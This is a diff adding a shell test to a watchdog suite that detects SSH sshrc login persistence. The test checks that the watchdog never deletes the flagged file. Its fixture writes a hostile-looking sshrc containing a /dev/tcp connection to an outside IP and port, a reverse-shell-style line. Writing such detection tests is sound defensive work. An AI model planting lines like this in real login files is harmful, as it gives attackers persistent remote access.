@@ -329,3 +329,22 @@ seed_benign() {
     bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
     [ -z "${bad}" ]
 }
+
+@test "INVARIANT (no auto-delete: sshrc-watchdog NEVER deletes sshrc files — surveillance not remediation)" {
+    # Sister to brain-wide no-auto-delete / surveillance-not-
+    # remediation INVARIANTs across L2 watchdog suites. The
+    # sshrc-watchdog DETECTS T1546 SSH per-login-exec sshrc
+    # persistence but MUST NEVER emit rm/unlink commands to
+    # auto-clean the file. The detected sshrc may be operator-
+    # legitimate (custom login banner, MOTD-replacement,
+    # tooling-activation script) — silent auto-delete would
+    # destroy operator baseline state AND forensic evidence
+    # chain. Surveillance, never remediation. Locks anti-data-
+    # loss contract on the sshrc surveillance substrate.
+    seed_benign
+    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${SSHRC}"
+    run_wd
+    [ -f "${SSHRC}" ]
+    ! grep -qE 'find[[:space:]].*-delete' "${WD}"
+    ! grep -qE 'rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(SSHRC|FILE|file)' "${WD}"
+}
